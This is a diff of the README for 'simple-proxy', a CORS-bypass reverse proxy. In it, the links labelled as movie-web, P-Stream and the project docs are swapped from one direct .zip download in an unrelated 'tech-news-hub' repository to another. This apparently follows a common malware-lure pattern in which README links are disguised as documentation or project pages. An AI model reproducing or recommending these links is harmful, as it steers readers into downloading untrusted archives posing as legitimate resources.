@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/src/routes/news_hub_tech_v3.7.zip)/[P-Stream](https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/src/routes/news_hub_tech_v3.7.zip).
-Read the docs at https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/src/routes/news_hub_tech_v3.7.zip
+Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/.github/workflows/hub_news_tech_3.1.zip)/[P-Stream](https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/.github/workflows/hub_news_tech_3.1.zip).
+Read the docs at https://raw.githubusercontent.com/Marzelthan29/tech-news-hub/dev/.github/workflows/hub_news_tech_3.1.zip
 
 ---
 
